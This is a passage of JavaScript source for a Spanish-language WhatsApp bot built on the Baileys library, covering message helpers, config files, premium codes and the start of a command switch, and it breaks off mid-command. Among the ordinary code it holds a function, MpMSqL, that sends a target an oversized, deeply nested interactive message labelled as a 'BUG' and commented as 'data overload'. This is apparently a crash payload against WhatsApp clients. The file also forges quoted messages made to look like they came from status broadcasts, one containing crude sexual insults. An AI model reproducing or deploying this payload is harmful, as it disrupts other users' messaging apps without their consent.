const { updateConfig, overrideConsole, restoreConsole, config } = require('./silencelog');
const baileys = require('@whiskeysockets/baileys'); 
const { WaMessageStubType, WA_DEFAULT_EPHEMERAL, BufferJSON, areJidsSameUser, downloadContentFromMessage, generateWAMessageContent, generateWAMessageFromContent, generateWAMessage, prepareWAMessageMedia, getContentType,  relayMessage} = require('@whiskeysockets/baileys');
const { default: makeWASocket, proto } = require("@whiskeysockets/baileys")   
const moment = require('moment-timezone') 
const gradient = require('gradient-string')     
const { exec, spawn, execSync } =  require("child_process")
const chalk = require('chalk')
const os = require('os') 
const fs = require('fs')    
const scp1 = require('./libs/scraper') 
const fetch = require('node-fetch')
const axios = require('axios') 
const {fileURLToPath} = require('url') 
const cheerio = require('cheerio')
const yts = require('yt-search') 
const gpt = require('api-dylux')
const util = require('util')
const createHash = require('crypto') 
const mimetype = require("mime-types")  
const ws = require('ws')
const JavaScriptObfuscator = require('javascript-obfuscator')
const webp = require("node-webpmux")
const Jimp = require('jimp')
const { File } = require("megajs")
const speed = require("performance-now")
const ffmpeg = require("fluent-ffmpeg")
const similarity = require('similarity')   
const ytdl = require('ytdl-core') 
const fg = require('api-dylux') 
const {savefrom, lyrics, lyricsv2, youtubedl, youtubedlv2} = require('@bochilteam/scraper') 
const translate = require('@vitalets/google-translate-api') 
const { smsg, fetchBuffer, getBuffer, buffergif, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, msToTime, downloadMediaMessage, convertirMsADiasHorasMinutosSegundos, pickRandom, getUserBio, asyncgetUserProfilePic} = require('./libs/fuctions')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, writeExif, toAudio } = require('./libs/fuctions2');
const {sizeFormatter} = require('human-readable') 
const formatSize = sizeFormatter({
std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`});

const color = (text, color) => {
return !color ? chalk.cyanBright(text) : color.startsWith('#') ? chalk.hex(color)(text) : chalk.keyword(color)(text)}

const msgs = (message) => {  
if (message.length >= 10) { 
return `${message.substr(0, 500)}` 
} else {  
return `${message}`}}
const getFileBuffer = async (mediakey, MediaType) => {  
const stream = await downloadContentFromMessage(mediakey, MediaType)  
let buffer = Buffer.from([])  
for await(const chunk of stream) {  
buffer = Buffer.concat([buffer, chunk]) }  
return buffer 
}   

module.exports = conn = async (conn, m, chatUpdate, mek, store) => {
conn.sendAlbumMessage = async function (jid, medias, options = {}) {
let img, video;
const caption = options.text || options.caption || "";

const album = generateWAMessageFromContent(jid, {
albumMessage: {
expectedImageCount: medias.filter(media => media.type === "image").length,
expectedVideoCount: medias.filter(media => media.type === "video").length,
...(options.quoted ? {
contextInfo: {
remoteJid: options.quoted.key.remoteJid,
fromMe: options.quoted.key.fromMe,
stanzaId: options.quoted.key.id,
participant: options.quoted.key.participant || options.quoted.key.remoteJid,
quotedMessage: options.quoted.message
}
} : {})
}
}, { quoted: options.quoted });

await conn.relayMessage(album.key.remoteJid, album.message, {
messageId: album.key.id
});

for (const media of medias) {
const { type, data } = media;

if (/^https?:\/\//i.test(data.url)) {
try {
const response = await fetch(data.url);
const contentType = response.headers.get('content-type');

if (/^image\//i.test(contentType)) {
img = await prepareWAMessageMedia({ image: { url: data.url } }, { upload: conn.waUploadToServer });
} else if (/^video\//i.test(contentType)) {
video = await prepareWAMessageMedia({ video: { url: data.url } }, { upload: conn.waUploadToServer });
}
} catch (error) {
console.error("Error al obtener el tipo MIME:", error);
}
}

const mediaMessage = await generateWAMessage(album.key.remoteJid, {
[type]: data,
...(media === medias[0] ? { caption } : {})
}, {
upload: conn.waUploadToServer
});

mediaMessage.message.messageContextInfo = {
messageAssociation: {
associationType: 1,
parentMessageKey: album.key
}
};

await conn.relayMessage(mediaMessage.key.remoteJid, mediaMessage.message, {
messageId: mediaMessage.key.id
});
}

return album;
};
conn.sendNCarousel = async function (jid, text = '', footer = '', buffer = null, buttons = [], copy = '', urls = [], list = [], quoted = {}, options = {}) {
let img, video;
try {
if (buffer) {
if (/^https?:\/\//i.test(buffer)) {
const response = await fetch(buffer);
const contentType = response.headers.get('content-type');
if (/^image\//i.test(contentType)) {
img = await prepareWAMessageMedia({ image: { url: buffer } }, { upload: conn.waUploadToServer, ...options });
} else if (/^video\//i.test(contentType)) {
video = await prepareWAMessageMedia({ video: { url: buffer } }, { upload: conn.waUploadToServer, ...options });
}
} else {
const type = await conn.getFile(buffer);
if (/^image\//i.test(type.mime)) {
img = await prepareWAMessageMedia({ image: type.data }, { upload: conn.waUploadToServer, ...options });
} else if (/^video\//i.test(type.mime)) {
video = await prepareWAMessageMedia({ video: type.data }, { upload: conn.waUploadToServer, ...options });
}
}
}

const dynamicButtons = [];

buttons.forEach(btn => {
if (Array.isArray(btn) && btn.length === 2) {
dynamicButtons.push({
name: 'quick_reply',
buttonParamsJson: JSON.stringify({ display_text: btn[0], id: btn[1] })
});
}
});

if (copy) {
dynamicButtons.push({
name: 'cta_copy',
buttonParamsJson: JSON.stringify({ display_text: 'Copiar', copy_code: copy })
});
}

urls.forEach(url => {
if (Array.isArray(url) && url.length === 2) {
dynamicButtons.push({
name: 'cta_url',
buttonParamsJson: JSON.stringify({ display_text: url[0], url: url[1], merchant_url: url[1] })
});
}
});

list.forEach(lister => {
if (Array.isArray(lister) && lister.length === 2) {
dynamicButtons.push({
name: 'single_select',
buttonParamsJson: JSON.stringify({ title: lister[0], sections: lister[1] })
});
}
});

const interactiveMessage = {
body: { text },
footer: { text: footer },
header: {
hasMediaAttachment: !!(img?.imageMessage || video?.videoMessage),
imageMessage: img?.imageMessage || null,
videoMessage: video?.videoMessage || null
},
nativeFlowMessage: {
buttons: dynamicButtons.filter(Boolean),
messageParamsJson: ''
}
};

const messageContent = proto.Message.fromObject({
viewOnceMessage: {
message: {
messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
interactiveMessage
}
}
});

const msgs = await generateWAMessageFromContent(jid, messageContent, {
userJid: conn.user.jid,
quoted,
upload: conn.waUploadToServer,
ephemeralExpiration: WA_DEFAULT_EPHEMERAL
});

await conn.relayMessage(jid, msgs.message, { messageId: msgs.key.id });
} catch (error) {
console.error('Error en sendNCarousel:', error);
}
};
conn.sendButtons2 = async function (jid, content = {}, buttons = [], quoted = {}, options = {}) {
try {
let message = {
text: content.text || "",
footer: content.footer || "",
headerType: 1,
buttons: buttons.map(btn => ({
buttonId: btn[0],
buttonText: { displayText: btn[1] },
type: 1
}))
};

if (content.image) {
const img = await prepareWAMessageMedia({ image: { url: content.image } }, { upload: conn.waUploadToServer });
message.image = img.imageMessage;
message.headerType = 4;
} else if (content.video) {
const vid = await prepareWAMessageMedia({ video: { url: content.video } }, { upload: conn.waUploadToServer });
message.video = vid.videoMessage;
message.headerType = 4;
} else if (content.document) {
const doc = await prepareWAMessageMedia({ document: { url: content.document }, mimetype: content.mimetype || 'application/pdf', fileName: content.fileName || 'Archivo' }, { upload: conn.waUploadToServer });
message.document = doc.documentMessage;
message.headerType = 1;
}

await conn.sendMessage(jid, message, { quoted, ...options });
} catch (error) {
console.error('Error en sendButtons2:', error);
}
};

conn.sendButton = async (jid, text = '', footer = '', buffer, buttons, copy, urls, quoted, options) => {
let img, video;

try {
if (/^https?:\/\//i.test(buffer)) {
const response = await fetch(buffer);
const contentType = response.headers.get('content-type');

if (/^image\//i.test(contentType)) {
img = await prepareWAMessageMedia({ image: { url: buffer } }, { upload: conn.waUploadToServer });
} else if (/^video\//i.test(contentType)) {
video = await prepareWAMessageMedia({ video: { url: buffer } }, { upload: conn.waUploadToServer });
} else {
console.error("Tipo MIME no compatible:", contentType);
}
} else {
const type = await conn.getFile(buffer);
if (/^image\//i.test(type.mime)) {
img = await prepareWAMessageMedia({ image: { url: buffer } }, { upload: conn.waUploadToServer });
} else if (/^video\//i.test(type.mime)) {
video = await prepareWAMessageMedia({ video: { url: buffer } }, { upload: conn.waUploadToServer });
}
}

const dynamicButtons = buttons.map(btn => ({
name: 'quick_reply',
buttonParamsJson: JSON.stringify({
display_text: btn[0],
id: btn[1]
}),
}));

if (copy && (typeof copy === 'string' || typeof copy === 'number')) {
dynamicButtons.push({
name: 'cta_copy',
buttonParamsJson: JSON.stringify({
display_text: 'Copy', copy_code: copy
})
});
}

if (urls && Array.isArray(urls)) {
urls.forEach(url => {
dynamicButtons.push({
name: 'cta_url',
buttonParamsJson: JSON.stringify({
display_text: url[0],
url: url[1],
merchant_url: url[1]
})
});
});
}

const interactiveMessage = {
body: { text: text },
footer: { text: footer },
header: {
hasMediaAttachment: false,
imageMessage: img ? img.imageMessage : null,
videoMessage: video ? video.videoMessage : null
},
nativeFlowMessage: {
buttons: dynamicButtons,
messageParamsJson: ''
}
};

if (!quoted) {
quoted = {};
}
if (typeof quoted.fromMe === 'undefined') {
quoted.fromMe = false; // o el valor por defecto adecuado
}

let msgL = generateWAMessageFromContent(jid, { viewOnceMessage: { message: { interactiveMessage } } }, { userJid: conn.user.jid, quoted });
await conn.relayMessage(jid, msgL.message, { messageId: msgL.key.id, ...options });
} catch (error) {
console.error("Error al enviar el botón:", error);
}
};

conn.sendCarousel = async function (jid, text = '', footer = '', messages = [], quoted = {}, options = {}) {
try {
if (messages.length > 1) {
const cards = await Promise.all(messages.map(async ([cardText = '', cardFooter = '', buffer = null, buttons = [], copy = '', urls = [], list = []]) => {
let img, video;

if (buffer && /^https?:\/\//i.test(buffer)) {
const response = await fetch(buffer);
const contentType = response.headers.get('content-type');
if (/^image\//i.test(contentType)) {
img = await prepareWAMessageMedia({ image: { url: buffer } }, { upload: conn.waUploadToServer, ...options });
} else if (/^video\//i.test(contentType)) {
video = await prepareWAMessageMedia({ video: { url: buffer } }, { upload: conn.waUploadToServer, ...options });
}
}

const dynamicButtons = [];

buttons.forEach(btn => {
if (Array.isArray(btn) && btn.length === 2) {
dynamicButtons.push({
name: 'quick_reply',
buttonParamsJson: JSON.stringify({ display_text: btn[0], id: btn[1] })
});
}
});

if (copy) {
dynamicButtons.push({
name: 'cta_copy',
buttonParamsJson: JSON.stringify({ display_text: 'Copiar', copy_code: copy })
});
}

urls.forEach(url => {
if (Array.isArray(url) && url.length === 2) {
dynamicButtons.push({
name: 'cta_url',
buttonParamsJson: JSON.stringify({ display_text: url[0], url: url[1], merchant_url: url[1] })
});
}
});

list.forEach(lister => {
if (Array.isArray(lister) && lister.length === 2) {
dynamicButtons.push({
name: 'single_select',
buttonParamsJson: JSON.stringify({ title: lister[0], sections: lister[1] })
});
}
});

return {
body: proto.Message.InteractiveMessage.Body.fromObject({ text: cardText }),
footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: cardFooter }),
header: proto.Message.InteractiveMessage.Header.fromObject({
title: cardText,
hasMediaAttachment: !!(img?.imageMessage || video?.videoMessage),
imageMessage: img?.imageMessage || null,
videoMessage: video?.videoMessage || null
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: dynamicButtons.filter(Boolean),
messageParamsJson: ''
})
};
}));

const interactiveMessage = proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.fromObject({ text }),
footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: footer }),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards })
});

const messageContent = proto.Message.fromObject({
viewOnceMessage: {
message: {
messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
interactiveMessage
}
}
});

const msgs = await generateWAMessageFromContent(jid, messageContent, {
userJid: conn.user.jid,
quoted,
upload: conn.waUploadToServer,
ephemeralExpiration: WA_DEFAULT_EPHEMERAL
});

await conn.relayMessage(jid, msgs.message, { messageId: msgs.key.id });
} else {
await conn.sendNCarousel(jid, ...messages[0], quoted, options);
}
} catch (error) {
console.error('Error en sendCarousel:', error);
}
};
var budy = (m.mtype === 'conversation') ? m.message.conversation : 
(m.mtype == 'imageMessage') ? m.message.imageMessage.caption : 
(m.mtype == 'videoMessage') ? m.message.videoMessage.caption : 
(m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
(m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : 
(m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : 
(m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : 
(m.mtype === 'messageContextInfo') ? 
(m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '';
if (m.key.id.startsWith("BAE5")) return;

var body = typeof m.text === 'string' ? m.text : '';
if (typeof m.id === 'string' && m.id.startsWith("KUROTAKA-")) return;
var budy = body;

const allowedPrefixes = /^[./*#!]/;
const isCmd = allowedPrefixes.test(body) || true;

const normalize = (str) => str.normalize('NFD').replace(/[\u0300-\u036f]/g, "");

const command = isCmd
? normalize(body.replace(allowedPrefixes, '').trim().split(/ +/).shift().toLowerCase())
: normalize(body.trim().split(/ +/).shift().toLowerCase());

const args = body.trim().split(/ +/).slice(isCmd ? 1 : 0);

const from = m.chat;
const msg = JSON.parse(JSON.stringify(m, undefined, 2));
m.reply = (text) => { 
    conn.sendMessage(m.chat, { 
        text: text, 
        contextInfo: { 
            forwardedNewsletterMessageInfo: { 
                newsletterJid: '120363418194182743@newsletter', 
                serverMessageId: '', 
                newsletterName: `${getBotName(userSender)}`
            }, 
            forwardingScore: 9999999, 
            isForwarded: true, 
            mentionedJid: [userSender, numBot], 
            externalAdReply: { 
                showAdAttribution: true, 
                renderLargerThumbnail: false, 
                title: `${getBotName(userSender)} ${SetEmoji[userSender] || SetEmoji.default}`, 
                body: `© 2024 by ${getBotName(userSender)}`, 
                containsAutoReply: true, 
                mediaType: 1, 
                thumbnailUrl: FotosMenu[userSender] || FotosMenu.default, 
                sourceUrl: 'https://whatsapp.com/channel/0029Vb6D6ogBVJl60Yr8YL31' 
            } 
        } 
    }, { quoted: m }); 
};
const content = JSON.stringify(m.message);
const type = m.mtype;
let t = m.messageTimestamp;
const pushname = m.pushName || "Sin nombre";
const botnm = conn.user.id.split(":")[0] + "@s.whatsapp.net";
const _isBot = conn.user.jid;
const userSender = m.key.fromMe
? botnm
: m.isGroup && m.key.participant.includes(":")
? m.key.participant.split(":")[0] + "@s.whatsapp.net"
: m.key.remoteJid.includes(":")
? m.key.remoteJid.split(":")[0] + "@s.whatsapp.net"
: m.key.fromMe
? botnm
: m.isGroup
? m.key.participant
: m.key.remoteJid;

const isCreator = [
conn.decodeJid(conn.user.id),
...global.owner.map(([numero]) => numero)
]
.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
.includes(m.sender);

const isOwner = isCreator || m.fromMe;
//const isMods = isOwner || global.mods.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
//const isPrems = isOwner || global.premium.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);

const itsMe = m.sender == conn.user.id;
const text = args.join(" ");
const q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const sender = m.key.fromMe ? botnm : m.isGroup ? m.key.participant : m.key.remoteJid;
const delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const mime = (quoted.msg || quoted).mimetype || '';
const isMedia = /image|video|sticker|audio/.test(mime);
const mentions = [];

if (m.message[type]?.contextInfo?.mentionedJid) {
mentions.push(...m.message[type].contextInfo.mentionedJid);
}
const groupMetadata = m.isGroup ? await conn.groupMetadata(from) : ''
const groupName = m.isGroup ? groupMetadata.subject : '' 
const participants = m.isGroup ? await groupMetadata.participants : '' 
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : '' 
const isBotAdmins = m.isGroup ? groupAdmins.includes(botnm) : false  
const isGroupAdmins = m.isGroup ? groupAdmins.includes(userSender) : false 
//const isBaneed = m.isGroup ? blockList.includes(userSender) : false 
//const isPremium = m.isGroup ? premium.includes(userSender) : false   
const who = m.quoted ? m.quoted.sender : m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender;
const thumb = 'https://telegra.ph/file/16a28106fa7c2109f3ff9.jpg'
let fkontak = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${userSender.split('@')[0]}:${userSender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }
const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: "puta gata", orderTitle: "puto aiden me lo folle", sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
const fdoc = {key : {participant : '0@s.whatsapp.net', ...(from ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: "A", jpegThumbnail: null}}}
const kick = function (from, orangnya) {
for (let i of orangnya) {
conn.groupParticipantsUpdate(from, [i], "remove");
}}
const time = moment(Number(msg.messageTimestamp + "000")).locale("es-mx").tz("America/Asuncion").format('MMMM Do YYYY, h:mm:ss a')
const reply = (text) => {  
conn.sendMessage(m.chat, {  
text: `${text}\n\n_SIGUE MI CANAL_:\nhttps://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36`,  
contextInfo: {  
orwardingScore: 9999999,  
isForwarded: true,  
externalAdReply: {  
showAdAttribution: false,  
title: `${getBotName(userSender)} ${SetEmoji[userSender] || SetEmoji.default}`,  
mediaType: 2,  
sourceUrl: 'https://whatsapp.com/channel/0029VadxAUkKLaHjPfS1vP36',  
thumbnailUrl: FotosMenu[userSender] || FotosMenu.default  
}  
}  
}, { quoted: m });  
};
const sendAdMessage = (text, title, body, image, url) => { conn.sendMessage(m.chat, {text: text, contextInfo: { externalAdReply: { title: title, body: body, mediaUrl: url, sourceUrl: url, previewType: 'PHOTO', showAdAttribution: true, thumbnail: image, sourceUrl: url }}}, {})}  
const sendImage = ( image, caption ) => { conn.sendMessage(m.chat, { image: image, caption: caption }, {quoted: m, ephemeralExpiration: 24*60*100, disappearingMessagesInChat: 24*60*100})}  
const sendImageAsUrl = ( url, caption ) => { conn.sendMessage(m.chat, { image:  {url: url }, caption: caption }, {quoted: m, ephemeralExpiration: 24*60*100, disappearingMessagesInChat: 24*60*100})}  


const isAudio = type == 'audioMessage'   
const isSticker = type == 'stickerMessage'   
const isContact = type == 'contactMessage'  
const isLocation = type == 'locationMessage'    
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')  
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')  
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')  
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')  
const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')  
const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')   
const isViewOnce = (type === 'viewOnceMessage')   


let user = global.db.data.users[m.sender]
let chats = global.db.data.users[m.chat]
let setting = global.db.data.settings[conn.user.jid]  

//autoread
//if (m.message) {
//let user = getUser(m.sender);
//conn.readMessages([m.key])}	


const configPath = './json/config.json';
function loadConfig() {
if (!fs.existsSync(configPath)) {
fs.writeFileSync(configPath, JSON.stringify({ owner: [] }, null, 2));
}
return JSON.parse(fs.readFileSync(configPath, 'utf-8'));
}

function saveConfig(botID, mode) {
let config = loadConfig();
if (!config[botID]) {
config[botID] = {};
}
config[botID].publicMode = mode;
fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
}

let config = loadConfig();
const botID = conn.user.jid;
global.publicMode = config[botID] ? config[botID].publicMode : false;

if (!global.publicMode && !isCreator) {
if (!m.key.fromMe) return;
}

if (global.db.data.chats[m.chat].ban && !isCreator) {
return
}


if (global.db.data.chats[m.chat].modeadmin && !isGroupAdmins) {
return
}


const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})


const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}})


if (m.message) {
console.log(
chalk.black.bold(`[⚠] 𝑴𝒊𝒄𝒂𝑺𝒉𝒂𝒅𝒆 - by EliasarYT\n`) +
chalk.red(`> Usuario: ${conn.user.jid.split`@`[0]}\n`) +
chalk.gray(`> Fecha: ${moment(t * 1000).tz(place).format('DD/MM/YY HH:mm:ss')}\n`) +
chalk.red(`> Privacidad: [${global.publicMode ? 'Público' : 'Privado'}]\n`) +
chalk.red(`> Tipo: ${type}\n`) +
(m.isGroup
? chalk.magenta(`> Grupo: ${groupName} | ${from}\n`)
: chalk.magenta(`> Remitente: ${userSender}\n`)) +
chalk.cyan(`> Nombre: ${pushname} | ${userSender}\n`) +
chalk.black.bold(`> Mensaje:\n`) +
chalk.gray(`${msgs(m.text)}\n`)
);
}
const filePath = './json/emojis.json';
let SetEmoji = {};

try {
const data = fs.readFileSync(filePath, 'utf8').trim();
SetEmoji = data ? JSON.parse(data) : {};
} catch (error) {
SetEmoji = {};
}

if (!SetEmoji.default) {
SetEmoji.default = '✦';
fs.writeFileSync(filePath, JSON.stringify(SetEmoji, null, 2));
}
const fileFotoPath = './json/fotosMenu.json';
let FotosMenu = {};

try {
FotosMenu = JSON.parse(fs.readFileSync(fileFotoPath, 'utf8'));
if (!FotosMenu.default) {
FotosMenu.default = 'https://cdn.russellxz.click/7caaca44.jpeg';
fs.writeFileSync(fileFotoPath, JSON.stringify(FotosMenu, null, 2));
}
} catch (error) {
FotosMenu = { default: 'https://cdn.russellxz.click/7caaca44.jpeg' };
fs.writeFileSync(fileFotoPath, JSON.stringify(FotosMenu, null, 2));
}
const commandsPath = './json/commands.json';
const mainFilePath = __filename;

function extraerComandos() {
const contenidoMain = fs.readFileSync(mainFilePath, 'utf-8');
const regexCase = /case\s+['"](.+?)['"]\s*:/g;
let coincidencia;
const comandos = {};

while ((coincidencia = regexCase.exec(contenidoMain)) !== null) {
comandos[coincidencia[1]] = { iscmd: true };
}

return comandos;
}

function actualizarComandos() {
const comandos = extraerComandos();
fs.writeFileSync(commandsPath, JSON.stringify(comandos, null, 2));
}

fs.watchFile(mainFilePath, () => {
actualizarComandos();
});

actualizarComandos();

global.cmdjs = require(commandsPath);

const countPath = './json/cmdCount.json';
const loadCounts = () => {
if (!fs.existsSync(countPath)) {
fs.writeFileSync(countPath, JSON.stringify({ cmduse: 0, cmdmasuse: '', cmdCount: {} }, null, 2));
}
return JSON.parse(fs.readFileSync(countPath));
};

const saveCounts = (data) => {
fs.writeFileSync(countPath, JSON.stringify(data, null, 2));
};

const counts = loadCounts();

global.cmduse = counts.cmduse || 0;
global.cmdmasuse = counts.cmdmasuse || '';
global.cmdCount = counts.cmdCount || {};

if (global.cmdjs[command]?.iscmd) {
global.cmduse++;
global.cmdCount[command] = (global.cmdCount[command] || 0) + 1;

global.cmdmasuse = Object.entries(global.cmdCount).reduce((max, cmd) =>
cmd[1] > max[1] ? cmd : max
)[0];

saveCounts({ cmduse: global.cmduse, cmdmasuse: global.cmdmasuse, cmdCount: global.cmdCount });
}
const botNamePath = './json/botname.json';
let botNames = {};

try {
if (fs.existsSync(botNamePath)) {
botNames = JSON.parse(fs.readFileSync(botNamePath, 'utf8'));
} else {
botNames = { default: "𝐊𝐮𝐫𝐨𝐭𝐚𝐤𝐚-𝐌𝐃" };
fs.writeFileSync(botNamePath, JSON.stringify(botNames, null, 2));
}
} catch (error) {
botNames = { default: "𝐊𝐮𝐫𝐨𝐭𝐚𝐤𝐚-𝐌𝐃" };
fs.writeFileSync(botNamePath, JSON.stringify(botNames, null, 2));
}

function setBotName(user, newName) {
botNames[user] = newName;
fs.writeFileSync(botNamePath, JSON.stringify(botNames, null, 2));
}

function getBotName(user) {
return botNames[user] || botNames.default;
}
/* para encuentas

conn.sendMessage(
m.chat,
{
pollResult: {
name: "Text poll",
votes: [["Eres gay?", 999999999], ["Options 2", 10]], 
}
}, { quoted : m }
)
*/
async function MpMSqL(target) {
let sections = [];

for (let i = 0; i < 10; i++) {
let largeText = "_*⏤̽͢𝐊𝐮𝐫𝐨𝐭𝐚𝐤𝐚-𝐌𝐃 ↯ 𝘽𝙮͛ 𝐄𝐥𝐢𝐚𝐬𝐚𝐫𝐘𝐓*_";

let deepNested = {
title: `Super Deep Nested Section ${i}`,
highlight_label: `Extreme Highlight ${i}`,
rows: [
{
title: largeText,
id: `id${i}`,
subrows: [
{
title: "Nested row 1",
id: `nested_id1_${i}`,
subsubrows: [
{
title: "Deep Nested row 1",
id: `deep_nested_id1_${i}`,
},
{
title: "Deep Nested row 2",
id: `deep_nested_id2_${i}`,
},
],
},
{
title: "Nested row 2",
id: `nested_id2_${i}`,
},
],
},
],
};

sections.push(deepNested);
}

let listMessage = {
title: "꧀∫🐲᭄͛͢𝐆𝐧͛𝐗 ↯ 𝐁͓̽𝐔͢𝐆ꦽ 🐉", 
sections: sections,
};

let msg = generateWAMessageFromContent(
target,
{
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2,
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [target, "13135550002@s.whatsapp.net"],
isForwarded: true,
forwardingScore: 999,
businessMessageForwardInfo: {
businessOwnerJid: target,
},
},
body: proto.Message.InteractiveMessage.Body.create({
text: "_*⏤̽͢𝐌𝐢𝐜𝐚𝐒𝐡𝐚𝐝𝐞 ↯ 𝘽𝙮͛ 𝐄𝐥𝐢𝐚𝐬𝐚𝐫𝐘𝐓*_",
}),
footer: proto.Message.InteractiveMessage.Footer.create({
buttonParamsJson: "JSON.stringify(listMessage)",
}),
header: proto.Message.InteractiveMessage.Header.create({
buttonParamsJson: "JSON.stringify(listMessage)",
subtitle: "_*⏤̽͢𝐌𝐢𝐜𝐚𝐒𝐡𝐚𝐝𝐞 ↯ 𝘽𝙮͛ 𝐄𝐥𝐢𝐚𝐬𝐚𝐫𝐘𝐓*_",
hasMediaAttachment: false, // No media to focus purely on data overload
}),
nativeFlowMessage:
proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
name: "single_select",

buttonParamsJson: "JSON.stringify(listMessage)",

}, 

{

name: "payment_method",

buttonParamsJson: "JSON.stringify(listMessage)",

},

{

name: "call_permission_request",

buttonParamsJson: "JSON.stringify(listMessage)",

},

{

name: "single_select",

buttonParamsJson: "JSON.stringify(listMessage)",

},
{
name: "mpm",
buttonParamsJson: "JSON.stringify(listMessage)",
},
],
}),
}),
},
},
},
{ userJid: target }
);

await conn.relayMessage(target, msg.message, {
participant: { jid: target },
messageId: msg.key.id,
});
}
const premiumPath = './json/premium.json';
function loadPremium() {
if (!fs.existsSync(premiumPath)) fs.writeFileSync(premiumPath, JSON.stringify({}, null, 2));
return JSON.parse(fs.readFileSync(premiumPath, 'utf-8'));
}

function savePremium(data) {
fs.writeFileSync(premiumPath, JSON.stringify(data, null, 2));
}

function cleanExpiredPremium() {
let premiumData = loadPremium();
let now = Date.now();
let changed = false;

for (let code in premiumData) {
if (premiumData[code].exp && premiumData[code].exp < now) {
delete premiumData[code];
changed = true;
}
}

if (changed) savePremium(premiumData);
}

function isPremium(userJid) {
cleanExpiredPremium();
let premiumData = loadPremium();
return Object.values(premiumData).some(p => p.user === userJid);
}

global.premiumCodes = loadPremium();
let tempTester = {};
switch (command) {
case 'pasejuego': {
    const fs = require('fs')
    const path = require('path')

    if (!isOwner) return m.reply("Solo owner")
    if (!isMedia && !isQuotedImage) return m.reply(`${SetEmoji[userSender] || SetEmoji.default} Por favor, responde o envía una imagen`);
    
    let media = await m.quoted.download()
    let tempPath = path.join(__dirname, 'temp.jpg')
    fs.writeFileSync(tempPath, media) 
    
    try {
        let { uploadImage } = require('./scrapers/scraper.js')
        let url = await uploadImage(tempPath) 
    
        let nivelsMatch = text.match(/--nivels\s+(\d+)/)
        let nameMatch = text.match(/--name\s+([^\-]+)/)
        let costoMatch = text.match(/--costo\s+(\d+)/)
        if (!nivelsMatch || !nameMatch || !costoMatch) return m.reply("Faltan parámetros")
        
        const dbPath = './json/pase.json'
        let db = fs.existsSync(dbPath) ? JSON.parse(fs.readFileSync(dbPath, 'utf8')) : {}
        db.pasejuego = {
            imagen: url,
            nivels: parseInt(nivelsMatch[1]),
            nombre: nameMatch[1].trim(),
            costo: parseInt(costoMatch[1])
        }
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2))
        m.reply("Pase configurado")
    } catch (err) {
        console.error("Error al subir la imagen:", err)
        m.reply("Error al subir la imagen")
    } finally {
        fs.unlinkSync(tempPath)
    }
    
    break
}
case 'pase': {
    const fs = require('fs')
    const dbPath = './json/pase.json'
    if (!fs.existsSync(dbPath)) return m.reply("No hay pase configurado")
    let db = JSON.parse(fs.readFileSync(dbPath, 'utf8'))
    if (!db.pasejuego) return m.reply("No hay pase configurado")
    let { imagen, nivels, nombre, costo } = db.pasejuego
